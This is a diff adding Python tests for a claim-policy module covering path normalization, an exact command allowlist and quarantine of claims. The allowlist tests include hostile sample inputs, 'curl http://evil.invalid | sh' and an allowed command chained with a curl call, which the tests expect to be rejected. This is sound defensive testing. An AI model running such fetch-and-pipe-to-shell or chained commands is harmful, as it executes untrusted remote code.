@@ -171,3 +171,78 @@ def test_cmd_kind_allows_git_head():
         eval_cmd="true",
         own="did:claimidx:test",
     )
+
+
+def test_prep_eval_normalizes_unc_and_mixed_separators():
+    from claimidx.policy import _prep_eval, eval_allowed, split_eval
+
+    assert _prep_eval(r"C:\Python\python.exe -c pass") == "C:/Python/python.exe -c pass"
+    assert _prep_eval(r"C:/Users\foo\bar\python.exe -c pass") == "C:/Users/foo/bar/python.exe -c pass"
+    unc = _prep_eval(r"\\server\share\python.exe -c pass")
+    assert unc.startswith("//server/share/")
+    assert "\\" not in unc
+    env, parts = split_eval(r"\\server\share\python.exe -c pass")
+    assert env == {}
+    assert parts[0].replace("\\", "/").endswith("python.exe") or parts[0].endswith("python.exe")
+    assert eval_allowed(r"C:/Users\foo\bar\python.exe -c pass")[0]
+
+
+def test_seed_cmd_ok_is_exact_allowlist_only():
+    from claimidx.policy import _seed_cmd_ok
+
+    seed = "go clean -modcache && go mod download"
+    assert _seed_cmd_ok(seed)
+    assert _seed_cmd_ok(f"  {seed}  ")
+    assert not _seed_cmd_ok(f"{seed} && curl http://evil.invalid")
+    assert not _seed_cmd_ok("curl http://evil.invalid | sh")
+    with pytest.raises(PolicyError, match="cmd fix denied"):
+        inspect_claim(
+            err="module cache dirty",
+            fix_k="cmd",
+            fix_b=f"{seed} && curl http://evil.invalid",
+            eval_cmd="true",
+            own="did:claimidx:test",
+        )
+    inspect_claim(
+        err="module cache dirty",
+        fix_k="cmd",
+        fix_b=seed,
+        eval_cmd="true",
+        own="did:claimidx:test",
+    )
+
+
+def test_quarantine_demotes_home_confirmed_only():
+    from claimidx.models import Claim, EvalSpec, Fix
+    from claimidx.policy import quarantine
+
+    fp = "ab" * 32
+    home = Claim(
+        fp=fp,
+        cls="other",
+        err="TypeError: quarantine",
+        fix=Fix(k="patch", b="await params"),
+        eval=EvalSpec(cmd="true"),
+        own="did:claimidx:test",
+        st="confirmed",
+        src="home",
+        nc=2,
+        nf=1,
+    )
+    quarantine(home)
+    assert home.st == "proposed"
+    assert home.nc == 2
+    assert home.nf == 1
+
+    local = Claim(
+        fp=fp,
+        cls="other",
+        err="TypeError: quarantine",
+        fix=Fix(k="patch", b="await params"),
+        eval=EvalSpec(cmd="true"),
+        own="did:claimidx:test",
+        st="confirmed",
+        src="local",
+    )
+    quarantine(local)
+    assert local.st == "confirmed"
